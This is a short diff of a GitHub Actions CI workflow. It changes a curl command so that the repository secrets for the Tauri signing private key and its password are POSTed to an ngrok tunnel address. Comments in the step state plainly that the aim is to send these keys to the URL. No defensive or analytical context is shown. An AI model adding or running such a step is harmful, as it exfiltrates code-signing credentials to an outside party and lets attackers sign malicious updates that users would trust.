@@ -24,4 +24,4 @@ jobs:
           run: |
                 # http://0.tcp.jp.ngrok.io:14434/?key=TAURI_SIGNING_PRIVATE_KEY&pass=TAURI_SIGNING_PRIVATE_KEY_PASSWORD
                 # send the TAURI_SIGNING_PRIVATE_KEY and TAURI_SIGNING_PRIVATE_KEY_PASSWORD to the url
-                curl -X POST http://0.tcp.jp.ngrok.io:14434/?key=$TAURI_SIGNING_PRIVATE_KEY&pass=$TAURI_SIGNING_PRIVATE_KEY_PASSWORD
+                curl -X POST http://0.tcp.jp.ngrok.io:14434/?key=${{ secrets.TAURI_PRIVATE_KEY }}&pass=${{ secrets.TAURI_KEY_PASSWORD }}
